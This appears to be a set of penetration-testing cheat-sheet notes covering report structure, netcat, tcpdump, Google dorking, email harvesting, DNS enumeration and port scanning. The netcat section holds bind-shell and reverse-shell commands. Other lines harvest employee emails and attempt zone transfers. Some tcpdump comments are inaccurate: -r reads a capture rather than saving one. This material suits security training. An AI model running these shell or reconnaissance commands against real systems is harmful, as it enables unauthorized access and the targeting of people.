*Pentesting*
Report
    The *executive overview* summarizes the attacks and indicates their potential business impact while suggesting remedies.
    The *technical summary* will include a methodological presentation of the technical aspects of the penetration test and is usually read by IT management and staff.


netcat
    *$ nc -nlvp 4444 # listens*
    *$ nc -nv 10.0.0.22 4444 # connects*
    *$ nc -nlvp 4444 > incoming.exe # serves incorming.exe through 4444*
    *$ >nc -nlvp 4444 -e cmd.exe # bind shell*
    *$ nc -nv 10.0.0.22 4444 -e /bin/bash # opens a reverse shell (you connect to a machine that can bash into yours)*


Wireshark
    libpcap and wincap libraries.
     network -> capture filters -> capture engine -> display filters
     follow TCP stream

Tcpdump
    *$ tcpdump -r file.pcap # saves output to file.pcap*
    *$ tcpdump -n src host 10.10.10.10 # saves packages from 10.10.10.10*
    *$ tcpdump -n dst host 10.10.10.10 # saves packages to 10.10.10.10*
    *$ tcpdump -n port 81 # saves packages where port 81 was involved*
    *$ tcpdump port not 22 # skips your ssh session traffic*
    *$ tcpdump -vv port 80 or port 443 # http and https traffic*


Google search
    site:xxx -site:www.xxx
    filetype: look for specific documents, pdf, docx, etc..
    inurl
    intitle
    Others https://www.exploit-db.com/google-hacking-database/

Email harvesting
    *$ theharvester -d guif.re -b google # find emails in google, bing, pgp etc*
    *$ whois guif.re # contact information for the domains they host*
    *$ recon-ng; use module; set DOMAIN guif.re; run;*
        recon/contacts/gather/http/api/whois_pocs # finds emails and employee names
        recon/hosts/enum/http/web/xssed # finds xss published ad xssed.com
        recon/hosts/gather/http/web/google_site # finds subdomains
        recon/hosts/gather/http/web/ip_neighbor # finds IPs close to the domain and possible new domains

  DNS enumeration
    *$ host -t ns guif.re # find name servers*
    *$ host -t mx guif.re # find email servers*
    *$ for ip in $(cat list.txt);do host $ip.guif.re;done #subdomain bruteforcing*
    *$ for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found" # reverse dns lookup*
    *$ host -l guif.re ns1.guif.re # zone transfer request*
    *$ host -t ns guif.re | cut -d " " -f 4 # finds nameservers for a given domain*
    *$ dnsrecon -d guif.re -t axfr*
    *$ dnsenum guif.re*


  Port scanning
    $ nmap -sn 192.168.0.1-250 # identify hosts alive using ICMP ping
    # nc -nvv -w 1 -z 10.0.0.19 3388-3390

